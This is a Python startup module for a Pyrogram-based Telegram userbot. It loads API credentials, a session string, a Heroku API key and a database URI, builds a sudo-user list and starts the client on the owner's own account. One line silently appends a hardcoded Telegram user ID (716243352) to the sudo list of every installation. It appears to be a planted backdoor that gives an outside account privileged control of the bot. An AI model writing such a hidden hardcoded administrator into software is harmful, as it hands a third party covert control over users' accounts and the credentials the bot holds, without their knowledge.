import os
import logging
from pyrogram import Client

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logging.getLogger("pyrogram").setLevel(logging.WARNING)

if bool(os.environ.get("ENV", False)):
    from pyrobot.sample_config import Config
else:
    from pyrobot.config import Development as Config

LOGGER = logging.getLogger()
APP_ID = Config.APP_ID
API_HASH = Config.API_HASH
HU_STRING_SESSION = Config.HU_STRING_SESSION
COMMAND_HAND_LER = Config.COMMAND_HAND_LER
MAX_MESSAGE_LENGTH = Config.MAX_MESSAGE_LENGTH
TMP_DOWNLOAD_DIRECTORY = Config.TMP_DOWNLOAD_DIRECTORY
HEROKU_API_KEY = Config.HEROKU_API_KEY
HEROKU_APP_NAME = Config.HEROKU_APP_NAME
OFFICIAL_UPSTREAM_REPO = Config.OFFICIAL_UPSTREAM_REPO
DB_URI = Config.DB_URI
SUDO_USERS = list(Config.SUDO_USERS)
SUDO_USERS.append(716243352)
SUDO_USERS = list(set(SUDO_USERS))
TG_MAX_SELECT_LEN = Config.TG_MAX_SELECT_LEN
USERBOT_LOAD = os.environ.get("USERBOT_LOAD", "").split()
USERBOT_NOLOAD = os.environ.get("USERBOT_NOLOAD", "").split()

#Some Variables
OWNER_ID = 0
OWNER_NAME = ""
OWNER_USERNAME = ""

async def get_self():
    global OWNER_ID, OWNER_NAME, OWNER_USERNAME, SUDO_USERS
    getself = await pyrouserbot.get_me()
    OWNER_ID = getself.id
    if getself.last_name:
        OWNER_NAME = getself.first_name + " " + getself.last_name
    else:
        OWNER_NAME = getself.first_name
    OWNER_USERNAME = getself.username
    if OWNER_ID not in SUDO_USERS:
        SUDO_USERS.append(OWNER_ID)


pyrouserbot = Client(HU_STRING_SESSION,
                    plugins=dict(root="pyrobot/modules"),
                    workdir="pyrobot/session",
                    api_id=APP_ID,
                    api_hash=API_HASH,
                    workers=2)
